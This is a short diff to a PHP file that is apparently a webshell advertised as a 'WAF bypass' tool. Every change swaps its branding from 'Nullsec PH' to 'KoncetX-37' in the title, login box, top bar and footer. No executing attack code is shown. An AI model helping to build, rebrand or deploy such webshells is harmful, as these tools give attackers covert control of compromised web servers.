@@ -206,7 +206,7 @@ if (isset($_GET['rename']) && $logged_in) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lei - Nullsec PH Webshell</title>
+    <title>Lei - KoncetX-37 Webshell</title>
     <style>
         * {
             margin: 0;
@@ -522,7 +522,7 @@ if (isset($_GET['rename']) && $logged_in) {
         <?php if (!$logged_in || !$key_valid): ?>
             <!-- Login Form -->
             <div class="login-box">
-                <h2>LEI - NULLSEC PH</h2>
+                <h2>LEI - KoncetX-37</h2>
                 
                 <?php if (isset($login_error)): ?>
                     <div class="msg"><?php echo htmlspecialchars($login_error); ?></div>
@@ -548,7 +548,7 @@ if (isset($_GET['rename']) && $logged_in) {
         <?php else: ?>
             <!-- Main Interface -->
             <div class="top-bar">
-                <span class="title">LEI - NULLSEC PH [WAF BYPASS]</span>
+                <span class="title">LEI - KoncetX-37 [WAF BYPASS]</span>
                 <a href="?logout=true" class="btn">LOGOUT</a>
             </div>
             
@@ -689,7 +689,7 @@ if (isset($_GET['rename']) && $logged_in) {
             <?php endif; ?>
             
             <div class="footer">
-                Lei - Nullsec PH | WAF Bypass Active
+                Lei - KoncetX-37 | WAF Bypass Active
             </div>
         <?php endif; ?>
     </div>
